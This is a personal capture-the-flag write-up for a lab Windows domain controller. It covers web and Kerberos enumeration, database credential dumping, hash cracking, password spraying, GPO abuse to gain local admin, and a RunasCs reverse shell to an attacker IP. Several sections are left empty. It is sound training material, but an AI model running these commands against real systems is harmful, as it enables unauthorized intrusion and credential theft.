# Reconnaissance
- 
## Nmap Enumeration
- We pass the commands:
	```bash
nmap -sV -sC -vv 10.10.1
nmap -sU --top-ports=10 -vv 10.10.1

---OUTPUT-TCP---
PORT     STATE SERVICE       REASON          VERSION
22/tcp   open  ssh           syn-ack ttl 127 OpenSSH for_Windows_9.5 (protocol 2.0)
53/tcp   open  domain        syn-ack ttl 127 (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
80/tcp   open  http          syn-ack ttl 127 Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-title: Did not follow redirect to http://frizzdc.frizz.htb/home/
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-04-24 01:16:05Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: frizz.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.95%I=7%D=4/23%Time=68092E73%P=x86_64-pc-linux-gnu%r(DNS-
SF:SD-TCP,30,"\0\.\0\0\x80\x82\0\x01\0\0\0\0\0\0\t_services\x07_dns-sd\x04
SF:_udp\x05local\0\0\x0c\0\x01");
Service Info: Hosts: localhost, FRIZZDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 21203/tcp): CLEAN (Timeout)
|   Check 2 (port 44502/tcp): CLEAN (Timeout)
|   Check 3 (port 49509/udp): CLEAN (Timeout)
|   Check 4 (port 34576/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-04-24T01:16:27
|_  start_date: N/A
|_clock-skew: 7h00m00s

---OUTPUT-UDP---
PORT     STATE         SERVICE      REASON
53/udp   open          domain       udp-response ttl 127
123/udp  open          ntp          udp-response ttl 127
```
----
## SMB Enumeration
- t
	```bash

```
- crackmapexec/netexec
	```bash

```
---
## Directory Enumeration
- Gobuster (tried a few but this gave some hits):
	- Directory
		```bash
gobuster dir -u http://frizzdc.frizz.htb/Gibbon-LMS -x php dns -k --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root

---OUTPUT---
/index.php            (Status: 200) [Size: 22064]
/login.php            (Status: 302) [Size: 0] [--> /Gibbon-LMS/index.php?loginReturn=fail0]
/resources            (Status: 301) [Size: 361] [--> http://frizzdc.frizz.htb/Gibbon-LMS/resources/]
/themes               (Status: 301) [Size: 358] [--> http://frizzdc.frizz.htb/Gibbon-LMS/themes/]
/modules              (Status: 301) [Size: 359] [--> http://frizzdc.frizz.htb/Gibbon-LMS/modules/]
/uploads              (Status: 301) [Size: 359] [--> http://frizzdc.frizz.htb/Gibbon-LMS/uploads/]
/version.php          (Status: 200) [Size: 0]
/privacypolicy.php    (Status: 200) [Size: 524]
/report.php           (Status: 200) [Size: 2617]
/license              (Status: 200) [Size: 35113]
/Index.php            (Status: 200) [Size: 22064]
/lib                  (Status: 301) [Size: 355] [--> http://frizzdc.frizz.htb/Gibbon-LMS/lib/]
/src                  (Status: 301) [Size: 355] [--> http://frizzdc.frizz.htb/Gibbon-LMS/src/]
/update.php           (Status: 200) [Size: 660]
/Resources            (Status: 301) [Size: 361] [--> http://frizzdc.frizz.htb/Gibbon-LMS/Resources/]
/Login.php            (Status: 302) [Size: 0] [--> /Gibbon-LMS/index.php?loginReturn=fail0]
/PrivacyPolicy.php    (Status: 200) [Size: 524]
/preferences.php      (Status: 200) [Size: 374]
/logout.php           (Status: 302) [Size: 0] [--> /Gibbon-LMS/index.php]
/export.php           (Status: 403) [Size: 0]
/Themes               (Status: 301) [Size: 358] [--> http://frizzdc.frizz.htb/Gibbon-LMS/Themes/]
/vendor               (Status: 301) [Size: 358] [--> http://frizzdc.frizz.htb/Gibbon-LMS/vendor/]
/config.php           (Status: 200) [Size: 0]
/error.php            (Status: 200) [Size: 2845]
/LICENSE              (Status: 200) [Size: 35113]
/%20                  (Status: 403) [Size: 306]
/privacyPolicy.php    (Status: 200) [Size: 524]
/functions.php        (Status: 200) [Size: 0]
/INDEX.php            (Status: 200) [Size: 22064]
/License              (Status: 200) [Size: 35113]

```
## Kerbrute
- I get a hit on :
	```bash
./kerbrute_linux_amd64 userenum --dc 10.10.11.60 -d frizz.htb /home/kali/Downloads/Windows/ActiveDirectory/TheFrizz/users

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 04/23/25 - Ronnie Flathers @ropnop

2025/04/23 15:00:15 >  Using KDC(s):
2025/04/23 15:00:15 >   10.10.11.60:88

2025/04/23 15:00:15 >  [+] VALID USERNAME:       f.frizzle@frizz.htb
2025/04/23 15:00:15 >  Done! Tested 9 usernames (1 valid) in 0.055 seconds
```
	- users file:
		```bash
cat users
ralphie
wanda
msfiona
fiona
fionafrizzle
f.frizzle
fiona.frizze
ms.fiona
ms.frizzle
```
## Website Enumeration
- 
### Direct
- Login using Gibbon
	- Forgot password
- Some users:
	- ralphie
	- wanda
	- fiona
- some text under hacking :
	```bash
V2FudCB0byBsZWFybiBoYWNraW5n IGJ1dCBkb24ndCB3YW50IHRvIGdv IHRvIGphaWw/IFlvdSdsbCBsZWFy biB0aGUgaW4ncyBhbmQgb3V0cyBv ZiBTeXNjYWxscyBhbmQgWFNTIGZy b20gdGhlIHNhZmV0eSBvZiBpbnRl cm5hdGlvbmFsIHdhdGVycyBhbmQg aXJvbiBjbGFkIGNvbnRyYWN0cyBm cm9tIHlvdXIgY3VzdG9tZXJzLCBy ZXZpZXdlZCBieSBXYWxrZXJ2aWxs ZSdzIGZpbmVzdCBhdHRvcm5leXMu
```
	- cleaned it using `:%s/ /\\r/g` to replace space with new line
	- decoding:
		```bash
cat crack| base64 -d

---OUTPUT---
Want to learn hacking but don't want to go to jail? You'll learn the in's and outs of Syscalls and XSS from the safety of international waters and iron clad contracts from your customers, reviewed by Walkerville's finest attorneys.
```


- in reverse shell found config.php with some db creds:
	```bash
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';
```
- After a lot of playing around I found mysql.exe in /xampp/mysql/bin and passed the following commands to eventually grab the password and salt:
	```bash
C:\xampp\mysql\bin\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -D gibbon --column-names -e "SELECT * FROM gibbonperson;" > C:\xampp\htdocs\gibbonperson.txt
--
C:\xampp\mysql\bin\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -D gibbon -e "SELECT username, passwordStrong, passwordStrongSalt FROM gibbonperson;" > C:\xampp\htdocs\gibbon_credentials.txt
--
cat gibbon_credentials.txt

---OUTPUT-CREDENTIALS---
username        passwordStrong  passwordStrongSalt
f.frizzle       067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03        /aACFhikmNopqrRTVz2489
```
- Then I saved this as a hash file in the format
	```bash
cat hash1

---OUTPUT---
$dynamic_65$067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03$/aACFhikmNopqrRTVz2489
```
- And then tried to crack it with john:
	```bash
john --format=dynamic='sha256($s.$p)' --wordlist=/usr/share/wordlists/rockyou.txt hash1

---OUTPUT---
Jenni_Luvs_Magic23 (?) 
```
- Tried to logon with winrm and first got some KDC error..
	- found that winrm was removed from the changelog
- Using kerbrute I tried to check if user credentials work and it did (did `sudo ntpdate 10.10.11.60` first for clock skew):
	```bash
./kerbrute_linux_amd64 passwordspray --dc 10.10.11.60 -d frizz.htb /home/kali/Downloads/Windows/ActiveDirectory/TheFrizz/user 'Jenni_Luvs_Magic23'

---OUTPUT---

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 04/24/25 - Ronnie Flathers @ropnop

2025/04/24 02:32:05 >  Using KDC(s):
2025/04/24 02:32:05 >   10.10.11.60:88

2025/04/24 02:32:11 >  [+] VALID LOGIN:  f.frizzle@frizz.htb:Jenni_Luvs_Magic23
2025/04/24 02:32:11 >  Done! Tested 1 logins (1 successes) in 5.059 seconds
```
- Grabbed a TGT
	```bash
impacket-getTGT -dc-ip 10.10.11.60 'frizz.htb/f.frizzle:Jenni_Luvs_Magic23'

---OUTPUT---
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in f.frizzle.ccache
```
- exported it to KRB5CCNAME
	```bash
export KRB5CCNAME=f.frizzle.ccache
```
- Tried to ssh with ticket
	```bash
ssh -K f.frizzle@10.10.11.60
```
	- Initially failed (just like winrm)
		- winrm did give an extra info in error talking about unable to find realm "FRIZZ.HTB"
- **Fix** 
	- I had to create a krb5.conf file to fix it
		```bash
cat /etc/krb5.conf

---OUTPUT---
[libdefaults]
    default_realm = FRIZZ.HTB
    dns_lookup_kdc = false
    dns_lookup_realm = false

[realms]
    FRIZZ.HTB = {
        kdc = frizzdc.frizz.htb
        admin_server = frizzdc.frizz.htb
    }

[domain_realm]
    .frizz.htb = FRIZZ.HTB
    frizz.htb = FRIZZ.HTB
```
	- ssh worked after this and I could grab user flag
## Privilege Escalation
- ON enumeration I found a hidden folder in C:\ drive
	```bash
cd C:\
Get-ChildItem -Force
--OR--
cmd /c "dir /a:dhs"
---OUTPUT-GET-CHILDITEM---
    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs          10/29/2024  7:31 AM                $RECYCLE.BIN
d--h-           3/10/2025  3:31 PM                $WinREAgent
d--hs           2/20/2025  2:51 PM                Config.Msi
l--hs          10/29/2024  9:12 AM                Documents and Settings -> C:\Users
d----           3/10/2025  3:39 PM                inetpub
d----            5/8/2021  1:15 AM                PerfLogs
d-r--           2/26/2025  8:13 AM                Program Files
d----            5/8/2021  2:34 AM                Program Files (x86)
d--h-           2/20/2025  2:50 PM                ProgramData
d--hs          10/29/2024  9:12 AM                Recovery
d--hs          10/29/2024  7:25 AM                System Volume Information
d-r--          10/29/2024  7:31 AM                Users
d----           3/10/2025  3:41 PM                Windows
d----          10/29/2024  7:28 AM                xampp
-a-hs          10/29/2024  8:27 AM          12288 DumpStack.log.tmp

---OUTPUT-CMD-DIR---
 Volume in drive C has no label.
 Volume Serial Number is D129-C3DA

 Directory of C:\

10/29/2024  07:31 AM    <DIR>          $RECYCLE.BIN
02/20/2025  03:51 PM    <DIR>          Config.Msi
10/29/2024  09:12 AM    <JUNCTION>     Documents and Settings [C:\Users]
10/29/2024  09:12 AM    <DIR>          Recovery
10/29/2024  07:25 AM    <DIR>          System Volume Information
               0 File(s)              0 bytes
               5 Dir(s)   1,990,946,816 bytes free

```
	- We find zip files inside.
- We grab the files using sftp:
	```bash
sftp -o GSSAPIAuthentication=yes -o GSSAPIDelegateCredentials=yes f.frizzle@frizz.htb
```
- Unzip with 7z:
	```bash
7z x \$RE2XMEG.7z
```
- We check out the folder (we find config directory):
	```bash
cd wapt/conf
cat waptserver.ini

---RELEVANT-OUTPUT---
wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
```
- We decode it :
	```bash
echo -n "IXN1QmNpZ0BNZWhUZWQhUgo=" | base64 -d

---OUTPUT---
!suBcig@MehTed!R
```
- We pass net users to get a list of all users:
	```bash
net users

---OUTPUT---
User accounts for \\

-------------------------------------------------------------------------------
a.perlstein              Administrator            c.ramon
c.sandiego               d.hudson                 f.frizzle
g.frizzle                Guest                    h.arm
J.perlstein              k.franklin               krbtgt
l.awesome                m.ramon                  M.SchoolBus
p.terese                 r.tennelli               t.wright
v.frizzle                w.li                     w.Webservice
The command completed with one or more errors.
```
- Copy users to a file and password spray with kerbrute with our new password:
	```bash
./kerbrute_linux_amd64 passwordspray --dc 10.10.11.60 -d frizz.htb /home/kali/Downloads/Windows/ActiveDirectory/TheFrizz/user '!suBcig@MehTed!R'

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 04/24/25 - Ronnie Flathers @ropnop

2025/04/24 05:21:20 >  Using KDC(s):
2025/04/24 05:21:20 >   10.10.11.60:88

2025/04/24 05:21:20 >  [+] VALID LOGIN:  M.SchoolBus@frizz.htb:!suBcig@MehTed!R
2025/04/24 05:21:20 >  Done! Tested 21 logins (1 successes) in 0.161 seconds
```
	- User M.SchoolBus has these credentials.
- We also grab some data for bloodhound analysis ( can also do this with f.frizzle)
	```bash
bloodhound-python -dc frizzdc.frizz.htb -ns 10.10.11.60 -d frizz.htb -u 'M.SchoolBus' -p '!suBcig@MehTed!R' -c all

---OUTPUT---

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: frizz.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: frizzdc.frizz.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: frizzdc.frizz.htb
INFO: Found 22 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 20 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: frizzdc.frizz.htb
INFO: Done in 00M 04S
```
	- Signs of GPOAbuse possibility (Bloodhound shows e own a lot of users/ writegplink/writegpo etc)
		- whoami /all will show:
- We login via ssh the same way as f.frizzle.
	```bash
impacket-getTGT -dc-ip 10.10.11.60 'frizz.htb/M.SchoolBus:!suBcig@MehTed!R'
export KRB5CCNAME=M.SchoolBus.ccache
ssh -K M.SchoolBus@10.10.11.60
```
	- We check whoami /all
		```bash
whoami /all

USER INFORMATION
----------------

User Name         SID                                           
================= ==============================================
frizz\m.schoolbus S-1-5-21-2386970044-1145388522-2932701813-1106


GROUP INFORMATION
-----------------

Group Name                                   Type             SID                                            Attributes                                     
                
============================================ ================ ============================================== ===============================================================
Everyone                                     Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group             
BUILTIN\Remote Management Users              Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group             
BUILTIN\Users                                Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group             
BUILTIN\Pre-Windows 2000 Compatible Access   Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\NETWORK                         Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Authenticated Users             Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization               Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
frizz\Desktop Admins                         Group            S-1-5-21-2386970044-1145388522-2932701813-1121 Mandatory group, Enabled by default, Enabled group
frizz\Group Policy Creator Owners            Group            S-1-5-21-2386970044-1145388522-2932701813-520  Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity   Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
frizz\Denied RODC Password Replication Group Alias            S-1-5-21-2386970044-1145388522-2932701813-572  Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\Medium Mandatory Level       Label            S-1-16-8192                                                                                   



PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

```
		- If we do net user we only see Desktop Admins group (which could also be a good tell of possible GPO)
			```bash
net user M.SchoolBus         

---OUTPUT---
User name                    M.SchoolBus
Full Name                    Marvin SchoolBus
Comment                      Desktop Administrator
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/29/2024 7:27:03 AM
Password expires             Never
Password changeable          10/29/2024 7:27:03 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   4/24/2025 12:08:47 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *Desktop Admins
The command completed successfully.
```
		- Group Policy Creator Owners **
			- Can edit group policies, hence and perform GPO Abuse
- For this GPO Abuse we require 2  files:
	- https://github.com/antonioCoco/RunasCs/releases/tag/v1.5
		- RunasC to run specific processes with different permissions than the user's current logon provides using explicit credentials. This tool is an improved and open version of windows builtin _runas.exe_ that solves some limitations.
			- We will need this to relogin once we exploit GPO to become administrator as windows on't re-evaluate group member permissions until you log out and back in.
			- So with this it will create a new process with updates tokens and we can grab it with our netcat listener.
	- https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0
		- Auto abuse GPO executable
- Final commands (GPO Abuse from M.SchoolBus):
	- Create new GPO and check i it exists
	```bash
# Create New GPO (might take a little time)
New-GPO -Name thishurts | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes

# List GPO
Get-GPO -All | Select DisplayName,Id

---OUTPUT-CREATE---
GpoId       : dbfddbdc-d11b-4011-b69f-9e83bf01ea66
DisplayName : thishurts
Enabled     : True
Enforced    : False
Target      : OU=Domain Controllers,DC=frizz,DC=htb
Order       : 2


---OUTPUT-2---

DisplayName                       Id
-----------                       --
Default Domain Policy             31b2f340-016d-11d2-945f-00c04fb984f9
Default Domain Controllers Policy 6ac1786c-016f-11d2-945f-00c04fb984f9
thishurts                         dbfddbdc-d11b-4011-b69f-9e83bf01ea66
```
- Then we use our executable as an exploit. (we can upload it with curl)
	- start python server on directory where our executables are:
		```bash
python3 -m http.server 8001
```
	- Grab the files from our target (make sure you are in a directory where you can upload the files):
		```bash
curl "http://10.10.14.25:8001/SharpGPOAbuse.exe" -o "SharpGPOAbuse.exe"
curl "http://10.10.14.25:8001/RunasCs.exe" -o "RunasCs.exe"
```
- Now we can pass our exploit and force the group policy to be updated so we can relogin  with new updated policy:
	```bash
# Exploit
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName thishurts

# Force Update GPU Policy
PS C:\Users\M.SchoolBus\Documents> gpupdate /force   

---OUTPUT-EXPLOIT---
[+] Domain = frizz.htb
[+] Domain Controller = frizzdc.frizz.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb
[+] SID Value of M.SchoolBus = S-1-5-21-2386970044-1145388522-2932701813-1106
[+] GUID of "thishurts" is: {A33BF629-D032-49F2-9F07-60B40B1D1942}
[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\{A33BF629-D032-49F2-9F07-60B40B1D1942}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
---OUTPUT-FORCE-UPDATE-GPU-POLICY---
Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.
```
	- Can also use another user here like f.frizzle (I tried to but user didn't get added to Adminsitrator local group)...however I did see f.frizzle in the localgroup when checking..the box is still active so someone did manage to do that somehow.
- Then we can check if it worked by checking the administrator group members (couldn't get f.frizzle to appear here...but did see user here maybe by another user doing this box):
	```bash
# Check if it worked
PS C:\Users\M.SchoolBus\Documents> net localgroup Administrators                                                                        
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
M.SchoolBus
The command completed successfully.
```
	- Also after this command, if you do `whoami /all` on the account we added to adminsitrators group, there will be a change under the User claim's information saying Kerberos auth won't work anymore pointing that we can't use our ticket to login again now.
		```bash
USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

```
- Since we won't be able to login with our tickets, we use RunasCs' to login again as it's meant for such purposes.
	```bash
.\RunasCs.exe M.SchoolBus !suBcig@MehTed!R cmd.exe -r 10.10.14.3:9998
```
	- with netcat listening on the port to get a reverse shell
		- We should be able to grab reverse shell
	-  Why not just send a new reverse shell?
		- You can, but:
			- Reverse shells (e.g. via nc.exe or PowerShell) inherit the current user token.
			- If the session was started before your user was elevated, it’s still a low-privilege shell, even if the user is now admin.

-------
--------




